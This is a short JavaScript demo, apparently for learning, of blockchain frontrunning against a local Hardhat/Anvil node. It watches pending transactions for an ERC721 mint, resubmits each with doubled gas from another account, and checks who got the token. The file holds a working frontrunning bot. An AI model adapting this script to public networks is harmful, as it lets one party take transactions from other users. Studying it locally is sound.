// npx hardhat node
// anvil

const { ethers } = require("ethers");

const provider = new ethers.JsonRpcProvider('http://127.0.0.1:8545');

const privateKeys = [
    "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80", // localnet account #0
    "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d" // localnet account #1
]

const signer0 = new ethers.Wallet(privateKeys[0], provider)
const signer1 = new ethers.Wallet(privateKeys[1], provider)

ERC721ABI = [
    "function ownerOf(uint256 tokenId) external view returns (address owner)",
    "function mint() external"
]
iface = new ethers.Interface(ERC721ABI)
ERC721Contract = new ethers.Contract("0x5FbDB2315678afecb367f032d93F642f64180aa3", ERC721ABI, provider)

// signer0 frontrun
provider.on("pending", async (txHash) => {
    let tx = await provider.getTransaction(txHash);
    if (tx) {
        // filter pending tx.data
        if (tx.data.indexOf(iface.getFunction("mint").selector) !== -1 && tx.from != signer0.address ) {
            console.log(`[${(new Date).toLocaleTimeString()}] pending tx: ${txHash}`)
            console.log("target tx:", tx)

            let parsedTx = iface.parseTransaction(tx)
            console.log("parsed tx:", parsedTx);

            // construct frontrun tx
            const txArgs = {
                to: tx.to,
                value: tx.value,
                maxPriorityFeePerGas: tx.maxPriorityFeePerGas * 2n,
                maxFeePerGas: tx.maxFeePerGas * 2n,
                gasLimit: tx.gasLimit * 2n,
                data: tx.data
            }

            const txFrontrun = await signer0.sendTransaction(txArgs)
            console.log("txFrontrun:", txFrontrun)
            const receipt = await txFrontrun.wait()
            console.log("txFrontrun receipt:", receipt)

            // check token id
            const token0Owner = await ERC721Contract.ownerOf(0)
            const token1Owner = await ERC721Contract.ownerOf(1)
            console.log("token0 owner:", token0Owner)
            console.log("token1 owner:", token1Owner)
            if (token0Owner === signer0.address && token1Owner === signer1.address) {
                console.log("frontrun success")
            }
        }
    }
});

async function main() {
    // signer1 mint
    const txMint = await ERC721Contract.connect(signer1).mint()
    console.log("txMint:", txMint)
    const txResponse = await provider.getTransaction(txMint.hash);
    console.log('txMint status:', txResponse.blockNumber ? 'Mined' : 'Pending');
    const receipt = await txMint.wait()
    console.log("txMint receipt:", receipt)
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});